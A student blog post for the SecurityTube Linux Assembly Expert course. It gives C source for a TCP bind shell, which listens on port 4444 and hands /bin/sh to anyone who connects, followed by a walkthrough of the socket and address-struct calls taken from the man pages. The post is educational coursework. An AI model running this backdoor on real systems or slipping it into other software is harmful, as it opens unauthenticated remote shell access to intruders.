## Assignment 0x01: Create A Shell_Bind_TCP Shellcode
---
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main ()
{
    // creates a TCP socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // creates an IP socket address struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;

    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

## Analysis of Shell_Bind_TCP.c
First, a TCP socket is created using the `socket` function. As described in `man 2 socket`, the function creates an endpoint for communication and returns a file descriptor that refers to that endpoint.

`socket()` expects a domain argument, a type argument, and a protocol argument.

In this case, the domain argument `AF_INET` specifies the IPv4 communication protocol, the type argument `SOCK_STREAM` specifies the connection-based TCP standard for data exchange, and the protocol argument `0` indicates that the system should select the default protocol number based on the previously specified domain and protocol arguments.

Next, the `sockaddr_in` IP socket address struct is created which is used in the forthcoming `bind` method. As further explained in `man 7 ip`, an IP  socket address is defined as a combination of an IP interface address and a 16-bit (2 byte) port number.

The man page also states that `sin_family` is always set to `AF_INET`, that `sin_port` defines a port number in network byte order (provided through `htons()` in this example), and that `sin_addr` is the host IP address and should be assigned one of the `INADDR_*` values (`INADDR_ANY` a.k.a `0.0.0.0` in this case). 

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

---
[Home](https://norrismw.github.io/SLAE)
